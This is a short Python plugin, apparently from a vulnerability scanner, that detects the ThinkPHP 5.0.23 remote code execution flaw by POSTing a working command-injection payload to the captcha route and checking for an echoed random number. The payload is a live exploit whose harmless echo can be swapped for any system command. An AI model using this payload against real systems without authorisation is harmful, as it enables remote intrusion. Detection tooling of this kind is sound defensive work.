# coding=utf-8
import random

from lib.Requests import Requests
from lib.verify import verify

vuln = ['ThinkPHP', 'ThinkSNS']
random_num = ''.join(str(i) for i in random.sample(range(0, 9), 8))


def check(url, ip, ports, apps):
    req = Requests()
    if verify(vuln, ports, apps):
        payload = r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "{}"'.format(random_num)
        try:
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            r = req.request(url + '/index.php?s=captcha', 'post', data=payload, headers=headers)
            if random_num in r.text:
                return 'thinkphp_5_0_23_rce | ' + url
        except Exception as e:
            pass
